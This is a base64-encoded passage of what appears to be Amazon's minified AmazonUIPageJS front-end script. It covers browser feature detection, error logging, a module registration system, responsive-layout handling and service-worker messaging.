ArIGIgKyAiICIpLmpvaW4oIiAiKS5yZXBsYWNlKC9eIHwgJC9nLCAiIikKICAgICAgICAgICAgfQoKICAgICAgICAgICAgZnVuY3Rpb24ga2EoYSkgewogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gYSgpCiAgICAgICAgICAgICAgICB9IGNhdGNoIChiKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICExCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGZ1bmN0aW9uIEwoKSB7CiAgICAgICAgICAgICAgICBpZiAoTSkgewogICAgICAgICAgICAgICAgICAgIHZhciBhID0gewogICAgICAgICAgICAgICAgICAgICAgICB3OiBmLmlubmVyV2lkdGggfHwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG4uY2xpZW50V2lkdGgsIGg6IGYuaW5uZXJIZWlnaHQgfHwgbi5jbGllbnRIZWlnaHQKICAgICAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgICAgIDUgPCBNYXRoLmFicyhhLncgLSBaLncpIHx8IDUwIDwgYS5oIC0gWi5oID8gKFogPSBhLCBOID0gNCwgKGEgPSBrLm1vYmlsZSB8fCBrLnRhYmxldCA/IDQ1MCA8IGEudyAmJiBhLncgPiBhLmggOiAxMjUwIDw9IGEudykgPyBFKG4sICJhLXdzIikgOiBuLmNsYXNzTmFtZSA9IFkobiwgImEtd3MiKSkgOiAwIDwgTiAmJiAoTi0tLCBsYSA9IHNldFRpbWVvdXQoTCwgMTYpKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICBmdW5jdGlvbiB5YShhKSB7CiAgICAgICAgICAgICAgICAoTSA9IGEgPT09IEEgPyAhTSA6ICEhYSkgJiYgTCgpCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGZ1bmN0aW9uIHphKCkgewogICAgICAgICAgICAgICAgcmV0dXJuIE0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgZnVuY3Rpb24gdShhLCBiKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gInN3OiIgKyAoYiB8fCAiIikgKyAiOiIgKyBhICsgIjoiCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGZ1bmN0aW9uIG1hKCkgewogICAgICAgICAgICAgICAgbmEuZm9yRWFjaChmdW5jdGlvbiAoYSkgewogICAgICAgICAgICAgICAgICAgIEcoYSkKICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGZ1bmN0aW9uIHAoYSkgewogICAgICAgICAgICAgICAgbmEucHVzaChhKQogICAgICAgICAgICB9CgogICAgICAgICAgICBmdW5jdGlvbiBvYShhLCBiLCBjLCBlKSB7CiAgICAgICAgICAgICAgICBpZiAoYykgewogICAgICAgICAgICAgICAgICAgIGIgPSBtKC9DaHJvbWUvaSkgJiYgIW0oL0VkZ2UvaSkgJiYgIW0oL09QUi9pKSAmJiAhYS5jYXBhYmlsaXRpZXMuaXNBbWF6b25BcHAgJiYgIW0obmV3IFJlZ0V4cChhYSArICJid3YiICsKICAgICAgICAgICAgICAgICAgICAgICAgYWEgKyAiYiIpKTsKICAgICAgICAgICAgICAgICAgICB2YXIgZyA9IHUoZSwgImJyb3dzZXIiKSwgZCA9IHUoZSwgInByb2RfbXNob3AiKSwgZiA9IHUoZSwgImJldGFfbXNob3AiKTsKICAgICAgICAgICAgICAgICAgICAhYS5jYXBhYmlsaXRpZXMuaXNBbWF6b25BcHAgJiYgYy5icm93c2VyICYmIGIgJiYgKHAoZyArICJzdXBwb3J0ZWQiKSwgYy5icm93c2VyLmFjdGlvbihnLCBlKSk7CiAgICAgICAgICAgICAgICAgICAgIWIgJiYgYy5icm93c2VyICYmIHAoZyArICJ1bnN1cHBvcnRlZCIpOwogICAgICAgICAgICAgICAgICAgIGMucHJvZE1zaG9wICYmIHAoZCArICJ1bnN1cHBvcnRlZCIpOwogICAgICAgICAgICAgICAgICAgIGMuYmV0YU1zaG9wICYmIHAoZiArICJ1bnN1cHBvcnRlZCIpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICJ1c2Ugc3RyaWN0IjsKICAgICAgICAgICAgdmFyIE8gPSBSLm5vdyA9IFIubm93IHx8IGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgIHJldHVybiArbmV3IFIKICAgICAgICAgICAgfSwgRCA9IGZ1bmN0aW9uIChhKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gYSAmJiBhLm5vdyA/IGEubm93LmJpbmQoYSkgOiBPCiAgICAgICAgICAgIH0oZi5wZXJmb3JtYW5jZSksIFAgPSBEKCksIHIgPSBmLkFtYXpvblVJUGFnZUpTIHx8IGYuUDsKICAgICAgICAgICAgaWYgKHIgJiYgci53aGVuICYmIHIucmVnaXN0ZXIpIHsKICAgICAgICAgICAgICAgIGZvciAodmFyIFAgPSBbXSwgbCA9IGguY3VycmVudFNjcmlwdDsgbDsgbCA9IGwucGFyZW50RWxlbWVudCkgbC5pZCAmJiBQLnB1c2gobC5pZCk7CiAgICAgICAgICAgICAgICByZXR1cm4gci5sb2coIkEgY29weSBvZiBQIGhhcyBhbHJlYWR5IGJlZW4gbG9hZGVkIG9uIHRoaXMgcGFnZS4iLAogICAgICAgICAgICAgICAgICAgICJGQVRBTCIsIFAuam9pbigiICIpKQogICAgICAgICAgICB9CiAgICAgICAgICAgIHZhciB2ID0gZi51ZTsKICAgICAgICAgICAgRygpOwogICAgICAgICAgICBHKCJhdWlfYnVpbGRfZGF0ZTozLjE5LjgtMjAyMC0wMS0xOSIpOwogICAgICAgICAgICB2YXIgUyA9IFtdLCBUID0gITEsIFU7CiAgICAgICAgICAgIFUgPSBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICBmb3IgKHZhciBhID0gc2V0VGltZW91dChVLCAwKSwgYiA9IE8oKTsgUy5sZW5ndGg7KSBpZiAoUy5zaGlmdCgpKCksIDUwIDwgTygpIC0gYikgcmV0dXJuOwogICAgICAgICAgICAgICAgY2xlYXJUaW1lb3V0KGEpOwogICAgICAgICAgICAgICAgVCA9ICExCiAgICAgICAgICAgIH07CiAgICAgICAgICAgIHZhciBkYSA9IHt9LCBCID0ge30sIGZhID0ge30sIEkgPSAhMTsKICAgICAgICAgICAgeShmLCAiYmVmb3JldW5sb2FkIiwgZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgSSA9ICEwOwogICAgICAgICAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICAgICAgSSA9ICExCiAgICAgICAgICAgICAgICB9LCAxRTQpCiAgICAgICAgICAgIH0pOwogICAgICAgICAgICB2YXIgZ2EgPSAvXnBydjovLCBXID0ge30sIEogPSB7fSwgViA9IHt9LCBoYSA9IHt9LCB4YSA9IDAsIGFhID0gU3RyaW5nLmZyb21DaGFyQ29kZSg5MiksIEYsIHogPSBbXSwKICAgICAgICAgICAgICAgIHBhID0gZi5vbmVycm9yOwogICAgICAgICAgICBmLm9uZXJyb3IgPSBmdW5jdGlvbiAoYSwgYiwgYywgZSwgZykgewogICAgICAgICAgICAgICAgZyAmJiAib2JqZWN0IiA9PT0gdHlwZW9mIGcgfHwgKGcgPSBFcnJvcihhLCBiLCBjKSwgZy5jb2x1bW5OdW1iZXIgPSBlLCBnLnN0YWNrID0gYiB8fCBjIHx8IGUgPyBxKGFhLCBnLm1lc3NhZ2UsICJhdCAiICsKICAgICAgICAgICAgICAgICAgICBxKCI6IiwgYiwgYywgZSkpIDogQSk7CiAgICAgICAgICAgICAgICB2YXIgZCA9IHoucG9wKCkgfHwge307CiAgICAgICAgICAgICAgICBnLmF0dHJpYnV0aW9uID0gcSgiOiIsIGcuYXR0cmlidXRpb24gfHwgZC5hdHRyaWJ1dGlvbiwgZC5uYW1lKTsKICAgICAgICAgICAgICAgIGcubG9nTGV2ZWwgPSBkLmxvZ0xldmVsOwogICAgICAgICAgICAgICAgZy5hdHRyaWJ1dGlvbiAmJiBjb25zb2xlICYmIGNvbnNvbGUubG9nICYmIGNvbnNvbGUubG9nKFtnLmxvZ0xldmVsIHx8ICJFUlJPUiIsIGEsICJ0aHJvd24gYnkiLCBnLmF0dHJpYnV0aW9uXS5qb2luKCIgIikpOwogICAgICAgICAgICAgICAgeiA9IFtdOwogICAgICAgICAgICAgICAgcGEgJiYgKGQgPSBbXS5zbGljZS5jYWxsKGFyZ3VtZW50cyksIGRbNF0gPSBnLCBwYS5hcHBseShmLCBkKSkKICAgICAgICAgICAgfTsKICAgICAgICAgICAgSy5wcm90b3R5cGUgPSB7CiAgICAgICAgICAgICAgICBsb2dFcnJvcjogZnVuY3Rpb24gKGEsIGIsIGMsIGUpIHsKICAgICAgICAgICAgICAgICAgICBiID0ge21lc3NhZ2U6IGIsIGxvZ0xldmVsOiBjIHx8ICJFUlJPUiIsIGF0dHJpYnV0aW9uOiBxKCI6IiwgdGhpcy5hdHRyaWJ1dGlvbiwgZSl9OwogICAgICAgICAgICAgICAgICAgIGlmIChmLnVlTG9nRXJyb3IpIHJldHVybiBmLnVlTG9nRXJyb3IoYSB8fCBiLCBhID8gYiA6IG51bGwpLCAhMDsKICAgICAgICAgICAgICAgICAgICBjb25zb2xlICYmIGNvbnNvbGUuZXJyb3IgJiYgKGNvbnNvbGUubG9nKGIpLCBjb25zb2xlLmVycm9yKGEpKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gITEKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICBlcnJvcjogZnVuY3Rpb24gKGEsIGIsIGMsIGUpIHsKICAgICAgICAgICAgICAgICAgICBhID0gRXJyb3IocSgiOiIsIGUsIGEsIGMpKTsKICAgICAgICAgICAgICAgICAgICBhLmF0dHJpYnV0aW9uID0gcSgiOiIsIHRoaXMuYXR0cmlidXRpb24sIGIpOwogICAgICAgICAgICAgICAgICAgIHRocm93IGE7CiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgZ3VhcmRFcnJvcjogWCgpLAogICAgICAgICAgICAgICAgZ3VhcmRGYXRhbDogWCgiRkFUQUwiKSwKICAgICAgICAgICAgICAgIGd1YXJkQ3VycmVudDogZnVuY3Rpb24gKGEpIHsKICAgICAgICAgICAgICAgICAgICB2YXIgYiA9IHpbei5sZW5ndGggLSAxXTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gYiA/IFgoYi5sb2dMZXZlbCwgYikuY2FsbCh0aGlzLCBhKSA6IGEKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICBsb2c6IGZ1bmN0aW9uIChhLCBiLCBjKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRoaXMubG9nRXJyb3IobnVsbCwgYSwgYiwgYykKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICBkZWNsYXJlOiBDKFtdLCAhMCwgITAsICEwKSwKICAgICAgICAgICAgICAgIHJlZ2lzdGVyOiBDKFtdLCAhMCksCiAgICAgICAgICAgICAgICBleGVjdXRlOiBDKFtdKSwKICAgICAgICAgICAgICAgIEFVSV9CVUlMRF9EQVRFOiAiMy4xOS44LTIwMjAtMDEtMTkiLAogICAgICAgICAgICAgICAgd2hlbjogaWEoKSwKICAgICAgICAgICAgICAgIG5vdzogaWEoITApLAogICAgICAgICAgICAgICAgdHJpZ2dlcjogZnVuY3Rpb24gKGEsIGIsIGMpIHsKICAgICAgICAgICAgICAgICAgICB2YXIgZSA9IE8oKTsKICAgICAgICAgICAgICAgICAgICB0aGlzLmRlY2xhcmUoYSwge2RhdGE6IGIsIHBhZ2VFbGFwc2VkVGltZTogZSAtIChmLmFQYWdlU3RhcnQgfHwgTmFOKSwgdHJpZ2dlclRpbWU6IGV9KTsKICAgICAgICAgICAgICAgICAgICBjICYmIGMuaW5zdHJ1bWVudCAmJiBGLndoZW4oInBydjphLWxvZ1RyaWdnZXIiKS5leGVjdXRlKGZ1bmN0aW9uIChiKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGIoYSkKICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIGhhbmRsZVRyaWdnZXJzOiBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICAgICAgdGhpcy5sb2coImhhbmRsZVRyaWdnZXJzIGRlcHJlY2F0ZWQiKQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIGF0dHJpYnV0ZUVycm9yczogZnVuY3Rpb24gKGEpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IEsoYSkKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICBfbmFtZXNwYWNlOiBmdW5jdGlvbiAoYSwgYikgewogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgSyhhLCBiKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9OwogICAgICAgICAgICB2YXIgdCA9IEgoZiwgIkFtYXpvblVJUGFnZUpTIiwgbmV3IEspOwogICAgICAgICAgICBGID0gdC5fbmFtZXNwYWNlKCJQYWdlSlMiLCAiQW1hem9uVUkiKTsKICAgICAgICAgICAgRi5kZWNsYXJlKCJwcnY6cC1kZWJ1ZyIsIGhhKTsKICAgICAgICAgICAgdC5kZWNsYXJlKCJwLXJlY29yZGVyLWV2ZW50cyIsIFtdKTsKICAgICAgICAgICAgdC5kZWNsYXJlKCJwLXJlY29yZGVyLXN0b3AiLCBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgIH0pOwogICAgICAgICAgICBIKGYsICJQIiwgdCk7CiAgICAgICAgICAgIGphKCk7CiAgICAgICAgICAgIGlmIChoLmFkZEV2ZW50TGlzdGVuZXIpIHsKICAgICAgICAgICAgICAgIHZhciBxYTsKICAgICAgICAgICAgICAgIGguYWRkRXZlbnRMaXN0ZW5lcigiRE9NQ29udGVudExvYWRlZCIsIHFhID0gZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgIHQudHJpZ2dlcigiYS1kb21yZWFkeSIpOwogICAgICAgICAgICAgICAgICAgIGgucmVtb3ZlRXZlbnRMaXN0ZW5lcigiRE9NQ29udGVudExvYWRlZCIsIHFhLCAhMSkKICAgICAgICAgICAgICAgIH0sICExKQogICAgICAgICAgICB9CiAgICAgICAgICAgIHZhciBuID0gaC5kb2N1bWVudEVsZW1lbnQsIGJhID0gZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgdmFyIGEgPSBbIk8iLCAibXMiLCAiTW96IiwgIldlYmtpdCJdLCBiID0gaC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgICAgICAgICAgICAgIHJldHVybiB7CiAgICAgICAgICAgICAgICAgICAgdGVzdEdyYWRpZW50czogZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgICAgICBiLnN0eWxlLmNzc1RleHQgPSAiYmFja2dyb3VuZC1pbWFnZTotd2Via2l0LWdyYWRpZW50KGxpbmVhcixsZWZ0IHRvcCxyaWdodCBib3R0b20sZnJvbSgjMUU0KSx0byh3aGl0ZSkpO2JhY2tncm91bmQtaW1hZ2U6LXdlYmtpdC1saW5lYXItZ3JhZGllbnQobGVmdCB0b3AsIzFFNCx3aGl0ZSk7YmFja2dyb3VuZC1pbWFnZTpsaW5lYXItZ3JhZGllbnQobGVmdCB0b3AsIzFFNCx3aGl0ZSk7IjsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIH5iLnN0eWxlLmJhY2tncm91bmRJbWFnZS5pbmRleE9mKCJncmFkaWVudCIpCiAgICAgICAgICAgICAgICAgICAgfSwgdGVzdDogZnVuY3Rpb24gKGMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGUgPSBjLmNoYXJBdCgwKS50b1VwcGVyQ2FzZSgpICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGMuc3Vic3RyKDEpOwogICAgICAgICAgICAgICAgICAgICAgICBjID0gKGEuam9pbihlICsgIiAiKSArIGUgKyAiICIgKyBjKS5zcGxpdCgiICIpOwogICAgICAgICAgICAgICAgICAgICAgICBmb3IgKGUgPSBjLmxlbmd0aDsgZS0tOykgaWYgKCIiID09PSBiLnN0eWxlW2NbZV1dKSByZXR1cm4gITA7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAhMQogICAgICAgICAgICAgICAgICAgIH0sIHRlc3RUcmFuc2Zvcm0zZDogZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgYSA9ICExOwogICAgICAgICAgICAgICAgICAgICAgICBmLm1hdGNoTWVkaWEgJiYgKGEgPSBmLm1hdGNoTWVkaWEoIigtd2Via2l0LXRyYW5zZm9ybS0zZCkiKS5tYXRjaGVzKTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGEKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0oKSwgciA9IG4uY2xhc3NOYW1lLCByYSA9IC8oXnwgKWEtbW9iaWxlKCB8JCkvLnRlc3QociksIHNhID0gLyhefCApYS10YWJsZXQoIHwkKS8udGVzdChyKSwgayA9IHsKICAgICAgICAgICAgICAgIGF1ZGlvOiBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICEhaC5jcmVhdGVFbGVtZW50KCJhdWRpbyIpLmNhblBsYXlUeXBlCiAgICAgICAgICAgICAgICB9LCB2aWRlbzogZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgIHJldHVybiAhIWguY3JlYXRlRWxlbWVudCgidmlkZW8iKS5jYW5QbGF5VHlwZQogICAgICAgICAgICAgICAgfSwgY2FudmFzOiBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICEhaC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKS5nZXRDb250ZXh0CiAgICAgICAgICAgICAgICB9LCBzdmc6IGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gISFoLmNyZWF0ZUVsZW1lbnROUyAmJgogICAgICAgICAgICAgICAgICAgICAgICAhIWguY3JlYXRlRWxlbWVudE5TKCJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIsICJzdmciKS5jcmVhdGVTVkdSZWN0CiAgICAgICAgICAgICAgICB9LCBvZmZsaW5lOiBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5hdmlnYXRvci5oYXNPd25Qcm9wZXJ0eSAmJiBuYXZpZ2F0b3IuaGFzT3duUHJvcGVydHkoIm9uTGluZSIpICYmIG5hdmlnYXRvci5vbkxpbmUKICAgICAgICAgICAgICAgIH0sIGRyYWdEcm9wOiBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICJkcmFnZ2FibGUiIGluIGguY3JlYXRlRWxlbWVudCgic3BhbiIpCiAgICAgICAgICAgICAgICB9LCBnZW9sb2NhdGlvbjogZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgIHJldHVybiAhIW5hdmlnYXRvci5nZW9sb2NhdGlvbgogICAgICAgICAgICAgICAgfSwgaGlzdG9yeTogZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgIHJldHVybiAhKCFmLmhpc3RvcnkgfHwgIWYuaGlzdG9yeS5wdXNoU3RhdGUpCiAgICAgICAgICAgICAgICB9LCB3ZWJ3b3JrZXI6IGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gISFmLldvcmtlcgogICAgICAgICAgICAgICAgfSwgYXV0b2ZvY3VzOiBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICJhdXRvZm9jdXMiIGluIGguY3JlYXRlRWxlbWVudCgiaW5wdXQiKQogICAgICAgICAgICAgICAgfSwgaW5wdXRQbGFjZWhvbGRlcjogZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgIHJldHVybiAicGxhY2Vob2xkZXIiIGluCiAgICAgICAgICAgICAgICAgICAgICAgIGguY3JlYXRlRWxlbWVudCgiaW5wdXQiKQogICAgICAgICAgICAgICAgfSwgdGV4dGFyZWFQbGFjZWhvbGRlcjogZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgIHJldHVybiAicGxhY2Vob2xkZXIiIGluIGguY3JlYXRlRWxlbWVudCgidGV4dGFyZWEiKQogICAgICAgICAgICAgICAgfSwgbG9jYWxTdG9yYWdlOiBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICJsb2NhbFN0b3JhZ2UiIGluIGYgJiYgbnVsbCAhPT0gZi5sb2NhbFN0b3JhZ2UKICAgICAgICAgICAgICAgIH0sIG9yaWVudGF0aW9uOiBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICJvcmllbnRhdGlvbiIgaW4gZgogICAgICAgICAgICAgICAgfSwgdG91Y2g6IGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gIm9udG91Y2hlbmQiIGluIGgKICAgICAgICAgICAgICAgIH0sIGdyYWRpZW50czogZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgIHJldHVybiBiYS50ZXN0R3JhZGllbnRzKCkKICAgICAgICAgICAgICAgIH0sIGhpcmVzOiBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICAgICAgdmFyIGEgPSBmLmRldmljZVBpeGVsUmF0aW8gJiYgMS41IDw9IGYuZGV2aWNlUGl4ZWxSYXRpbyB8fCBmLm1hdGNoTWVkaWEgJiYgZi5tYXRjaE1lZGlhKCIobWluLXJlc29sdXRpb246MTQ0ZHBpKSIpLm1hdGNoZXM7CiAgICAgICAgICAgICAgICAgICAgeCgiaGlSZXMiICsgKHJhID8gIk1vYmlsZSIgOiBzYSA/ICJUYWJsZXQiIDogIkRlc2t0b3AiKSwgYSA/IDEgOiAwKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gYQogICAgICAgICAgICAgICAgfSwgdHJhbnNmb3JtM2Q6IGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gYmEudGVzdFRyYW5zZm9ybTNkKCkKICAgICAgICAgICAgICAgIH0sIHRvdWNoU2Nyb2xsaW5nOiBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG0oL1dpbmRvd3Nob3B8YW5kcm9pZHxPUyAoWzUtOV18WzEtOV1bMC05XSspKF9bMC05XXsxLDJ9KSsgbGlrZSBNYWMgT1MgWHxDaHJvbWV8U2lsa3xGaXJlZm94fFRyaWRlbnQuKz87IFRvdWNoL2kpCiAgICAgICAgICAgICAgICB9LCBpb3M6IGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbSgvT1MgWzEtOV1bMC05XSooX1swLTldKikrIGxpa2UgTWFjIE9TIFgvaSkgJiYgIW0oL3RyaWRlbnR8RWRnZS9pKQogICAgICAgICAgICAgICAgfSwgYW5kcm9pZDogZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgIHJldHVybiBtKC9hbmRyb2lkLihbMS05XXxbTC1aXSkvaSkgJiYgIW0oL3RyaWRlbnR8RWRnZS9pKQogICAgICAgICAgICAgICAgfSwgbW9iaWxlOiBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHJhCiAgICAgICAgICAgICAgICB9LCB0YWJsZXQ6IGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gc2EKICAgICAgICAgICAgICAgIH0sIHJ0bDogZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgIHJldHVybiAicnRsIiA9PT0gbi5kaXIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfTsKICAgICAgICAgICAgZm9yIChsIGluIGspIGsuaGFzT3duUHJvcGVydHkobCkgJiYKICAgICAgICAgICAgKGtbbF0gPSBrYShrW2xdKSk7CiAgICAgICAgICAgIGZvciAodmFyIGNhID0gInRleHRTaGFkb3cgdGV4dFN0cm9rZSBib3hTaGFkb3cgYm9yZGVyUmFkaXVzIGJvcmRlckltYWdlIG9wYWNpdHkgdHJhbnNmb3JtIHRyYW5zaXRpb24iLnNwbGl0KCIgIiksIFEgPSAwOyBRIDwgY2EubGVuZ3RoOyBRKyspIGtbY2FbUV1dID0ga2EoZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgcmV0dXJuIGJhLnRlc3QoY2FbUV0pCiAgICAgICAgICAgIH0pOwogICAgICAgICAgICB2YXIgTSA9ICEwLCBsYSA9IDAsIFogPSB7dzogMCwgaDogMH0sIE4gPSA0OwogICAgICAgICAgICBMKCk7CiAgICAgICAgICAgIHkoZiwgInJlc2l6ZSIsIGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgIGNsZWFyVGltZW91dChsYSk7CiAgICAgICAgICAgICAgICBOID0gNDsKICAgICAgICAgICAgICAgIEwoKQogICAgICAgICAgICB9KTsKICAgICAgICAgICAgdmFyIHRhID0gewogICAgICAgICAgICAgICAgZ2V0SXRlbTogZnVuY3Rpb24gKGEpIHsKICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZi5sb2NhbFN0b3JhZ2UuZ2V0SXRlbShhKQogICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGIpIHsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9LCBzZXRJdGVtOiBmdW5jdGlvbiAoYSwgYikgewogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBmLmxvY2FsU3RvcmFnZS5zZXRJdGVtKGEsIGIpCiAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoYykgewogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfTsKICAgICAgICAgICAgbi5jbGFzc05hbWUgPSBZKG4sICJhLW5vLWpzIik7CiAgICAgICAgICAgIEUobiwgImEtanMiKTsKICAgICAgICAgICAgIW0oL09TIFsxLThdKF9bMC05XSopKyBsaWtlIE1hYyBPUyBYL2kpIHx8CiAgICAgICAgICAgIGYubmF2aWdhdG9yLnN0YW5kYWxvbmUgfHwgbSgvc2FmYXJpL2kpIHx8IEUobiwgImEtZW1iZXIiKTsKICAgICAgICAgICAgciA9IFtdOwogICAgICAgICAgICBmb3IgKGwgaW4gaykgay5oYXNPd25Qcm9wZXJ0eShsKSAmJiBrW2xdICYmIHIucHVzaCgiYS0iICsgbC5yZXBsYWNlKC8oW0EtWl0pL2csIGZ1bmN0aW9uIChhKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gIi0iICsgYS50b0xvd2VyQ2FzZSgpCiAgICAgICAgICAgIH0pKTsKICAgICAgICAgICAgRShuLCByLmpvaW4oIiAiKSk7CiAgICAgICAgICAgIG4uc2V0QXR0cmlidXRlKCJkYXRhLWF1aS1idWlsZC1kYXRlIiwgIjMuMTkuOC0yMDIwLTAxLTE5Iik7CiAgICAgICAgICAgIHQucmVnaXN0ZXIoInAtZGV0ZWN0IiwgZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgcmV0dXJuIHsKICAgICAgICAgICAgICAgICAgICBjYXBhYmlsaXRpZXM6IGssCiAgICAgICAgICAgICAgICAgICAgbG9jYWxTdG9yYWdlOiBrLmxvY2FsU3RvcmFnZSAmJiB0YSwKICAgICAgICAgICAgICAgICAgICB0b2dnbGVSZXNwb25zaXZlR3JpZDogeWEsCiAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2l2ZUdyaWRFbmFibGVkOiB6YQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9KTsKICAgICAgICAgICAgbSgvVUNCcm93c2VyL2kpIHx8IGsubG9jYWxTdG9yYWdlICYmIEUobiwgdGEuZ2V0SXRlbSgiYS1mb250LWNsYXNzIikpOwogICAgICAgICAgICB0LmRlY2xhcmUoImEtZXZlbnQtcmV2aXNlZC1oYW5kbGluZyIsICExKTsKICAgICAgICAgICAgdmFyIHc7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICB3ID0KICAgICAgICAgICAgICAgICAgICBuYXZpZ2F0b3Iuc2VydmljZVdvcmtlcgogICAgICAgICAgICB9IGNhdGNoIChhKSB7CiAgICAgICAgICAgICAgICBHKCJzdzpuYXZfZXJyIikKICAgICAgICAgICAgfQogICAgICAgICAgICB3ICYmICh5KHcsICJtZXNzYWdlIiwgZnVuY3Rpb24gKGEpIHsKICAgICAgICAgICAgICAgIGEgJiYgYS5kYXRhICYmIHgoYS5kYXRhLmssIGEuZGF0YS52KQogICAgICAgICAgICB9KSwgdy5jb250cm9sbGVyICYmIHcuY29udHJvbGxlci5wb3N0TWVzc2FnZSgiTVNHLVJEWSIpKTsKICAgICAgICAgICAgdmFyIG5hID0gW107CiAgICAgICAgICAgIChmdW5jdGlvbiAoYSkgewogICAgICAgICAgICAgICAgdmFyIGIgPSBhLnJlZywgYyA9IGEudW5yZWc7CiAgICAgICAgICAgICAgICB3ICYmIHcuZ2V0UmVnaXN0cmF0aW9ucyA/IChGLndoZW4oIkEiLCAiYS11dGlsIikuZXhlY3V0ZShmdW5jdGlvbiAoYSwgYikgewogICAgICAgICAgIC